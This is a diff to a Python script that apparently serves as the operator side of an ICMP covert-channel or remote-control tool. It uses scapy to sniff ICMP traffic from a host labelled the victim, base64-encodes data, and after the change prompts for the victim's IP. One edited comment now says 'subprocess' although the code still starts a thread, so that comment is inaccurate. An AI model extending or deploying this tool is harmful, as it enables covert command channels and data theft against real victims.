@@ -1,5 +1,6 @@
 import base64
 import threading
+from log import *
 from scapy.all import IP, ICMP, sr1, sniff
 
 def encode_data(data):
@@ -27,9 +28,9 @@ def start_sniffing(target_ip):
     sniff(filter=f"icmp and src host {target_ip}", prn=process_packet)
 
 def main():
-    target_ip = "<Victim_IP>"  # Replace with your client's IP address
+    target_ip = input("Enter Victim's IP:")  # Replace with your client's IP address
 
-    # Start the packet sniffing in a separate thread
+    # Start the packet sniffing in a separate subprocess
     sniff_thread = threading.Thread(target=start_sniffing, args=(target_ip,), daemon=True)
     sniff_thread.start()
 
